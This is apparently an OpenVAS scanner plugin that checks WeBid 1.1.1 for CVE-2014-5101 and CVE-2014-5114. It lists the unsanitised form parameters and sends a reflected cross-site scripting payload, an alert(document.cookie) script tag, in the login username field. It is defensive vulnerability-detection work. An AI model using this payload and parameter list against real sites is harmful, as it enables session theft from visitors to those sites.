###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_multiple_vuln.nasl 14185 2019-03-14 13:43:25Z cfischer $
#
# WeBid Multiple Cross Site Scripting And LDAP Injection Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:webidsupport:webid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804476");
  script_version("$Revision: 14185 $");
  script_cve_id("CVE-2014-5101", "CVE-2014-5114");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-14 14:43:25 +0100 (Thu, 14 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-07-29 12:53:33 +0530 (Tue, 29 Jul 2014)");
  script_name("WeBid Multiple Cross Site Scripting And LDAP Injection Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with WeBid and is prone to multiple cross site scripting
  and LDAP injection vVulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Mulltiple flaws are due to,

  - The /WeBid/user_login.php script does not validate input to the 'username'
  POST parameter before returning it to users.

  - The register.php script does not validate input to the 'TPL_name', 'TPL_nick',
  ' TPL_email', 'TPL_year', 'TPL_address', 'TPL_city', 'TPL_prov', 'TPL_zip',
  'TPL_phone', 'TPL_pp_email', 'TPL_authnet_id', 'TPL_authnet_pass',
  'TPL_wordpay_id', 'TPL_toocheckout_id', and 'TPL_moneybookers_email' POST
  parameters before returning it to users.

  - An input passed via the 'js' parameter is not properly sanitized upon
  submission to the loader.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WeBid Version 1.1.1");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127431");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_webid_detect.nasl");
  script_mandatory_keys("webid/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

postData = 'username="><script>alert(document.cookie);</script>' +
           '&password=&input=Login&action=login';

url = dir + "/user_login.php";

sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData);

rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

if(rcvRes =~ "HTTP/1\.. 200" && rcvRes =~ '"><script>alert\\(document.cookie\\);</.*script>"'
  && ">WeBid<" >< rcvRes)
{
  security_message(http_port);
  exit(0);
}
